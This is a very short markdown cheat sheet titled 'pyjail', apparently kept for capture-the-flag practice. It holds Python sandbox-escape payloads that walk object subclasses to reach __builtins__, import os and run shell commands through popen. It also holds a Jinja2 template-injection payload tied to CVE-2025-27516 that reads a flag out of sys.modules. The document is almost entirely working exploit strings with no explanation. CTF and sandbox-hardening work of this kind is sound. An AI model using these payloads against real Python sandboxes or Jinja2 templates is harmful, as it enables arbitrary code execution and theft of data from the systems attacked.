# pyjail

找 warnings

`''.__class__.__mro__[1].__subclasses__()[182].__init__.__dir__()`

`''.__class__.__mro__[1].__subclasses__()[182].__init__.__globals__["__builtins__"]["__import__"]('os').popen('ls').read()`

[CVE-2025-27516](https://github.com/pallets/jinja/commit/90457bbf33b8662926ae65cdde4c4c32e756e403) `{{'{0.__init__.__globals__[__builtins__][quit].__init__.__globals__[sys].modules[flag].flag}'|attr('format')(xxx)}}`
